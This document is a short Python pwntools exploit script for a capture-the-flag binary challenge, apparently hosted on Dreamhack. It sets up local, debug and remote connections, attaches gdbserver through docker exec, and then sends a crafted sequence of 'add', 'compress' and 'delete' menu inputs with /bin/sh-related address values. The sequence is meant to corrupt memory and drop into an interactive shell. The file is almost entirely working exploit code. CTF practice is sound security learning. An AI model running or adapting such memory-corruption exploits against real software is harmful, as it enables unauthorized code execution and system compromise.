#!/usr/bin/env python3
from pwn import *

exe = ELF("./main_patched")
libc = ELF('./libc.so.6')

context.binary = exe
context.log_level = "debug"
context.terminal = ['kgx', '--', 'bash', '-c']

local_port = 5000
localscript = f'''
file {exe.path}
define rerun
    !docker exec -u root -i debug_container bash -c "kill -9 \\$(pidof gdbserver) &"
    !docker exec -u root -i debug_container bash -c "gdbserver :9090 --attach \\$(pidof chall) &"
end
define con
    target remote :9090
end
'''

gdbscript = '''
brva 0x671e
c
'''

info = lambda msg: log.info(msg)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
sna = lambda p, msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sn = lambda p, data: p.sendline(str(data).encode())
s = lambda p, data: p.send(data)


def conn():
    if args.LOCAL:
        r = process ([exe.path])
        # r = remote ("localhost", local_port)
    elif args.GDB:
        r = gdb.debug ([exe.path], gdbscript=gdbscript, env={'SHELL': '/bin/bash'})
    elif args.REMOTE:
        r = remote("host8.dreamhack.games", 23484)

    return r

def debug_container(p):
    if args.LOCAL:
        gdbserver_cmd = "docker exec -u root -i debug_container bash -c".split()
        gdbserver_cmd.append("gdbserver :9090 --attach $(pidof prob)")
        process(gdbserver_cmd)
        
        # gdb.attach(('0.0.0.0', 9090), exe=exe.path, gdbscript=localscript)
        pause()

def addint (p, num):
    sna (p, b'>> ', 1)
    sna (p, b'= ', num)

def delint (p):
    sna (p, b'>> ', 2)

def compress (p):
    sna (p, b'>> ', 3)

def main():
    p = conn()
    if args.LOCAL and args.GDB:
        debug_container (p)

    binsh = 0x402576402576
    # 0x402576
    addint (p, 0x76)
    addint (p, 0x25)
    addint (p, 0x40)
    addint (p, 0)
    addint (p, 0)
    addint (p, 0)
    addint (p, 0)
    addint (p, 0)
    addint (p, binsh)
    addint (p, binsh)
    compress (p)

    for i in range (12):
        delint (p)

    p.interactive()

if __name__ == "__main__":
    main()